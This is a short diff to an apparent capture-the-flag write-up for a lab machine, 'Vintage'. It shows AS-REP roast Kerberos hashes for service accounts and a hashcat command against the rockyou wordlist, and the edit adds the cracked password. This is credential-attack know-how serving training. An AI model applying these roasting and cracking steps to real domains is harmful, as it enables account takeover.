@@ -554,7 +554,7 @@ $krb5asrep$23$svc_ldap@VINTAGE.HTB:576dc870c88a60aae0d2a40e16e0656d$b590962824be
 $krb5asrep$23$svc_sql@VINTAGE.HTB:7f721c7fd76af48f34c25897190d620c$124639b5b33120728f6429d945a9f221ec0bc18ab3655c2b04d784908ba6780a32cac3ea4315e306a3c00679e6337600b4d7fb4bf09f5014a26c48938f0a049bbc37759a761b3469b5b56d0ab4411d807bbd8d554934fcb92dd812fe0ba93162015de5d95ebc62d6287d9004c512d53ddb942b7909923e3237758f44de9d425af6651ddda73a9a68b325c8b4c05a41a1acb916db658c97b4261c0d3124d75d890ab02a6e71a6721bb58ddf099e150d880ee3423fd096c9e1d7babb5a9c41129e32af5c09bc658d0cfbc487f81f763e0f4dcf33172f7c5a2ebbd7d1d19cf28b58c8a16180482539c207ea
 ```
 
-Crack the password hash with `hashcat` → password `` found:
+Crack the password hash with `hashcat` → password `Zer0the0ne` found:
 
 ```console
 root@kali:~# hashcat hashes.txt /usr/share/wordlists/rockyou.txt
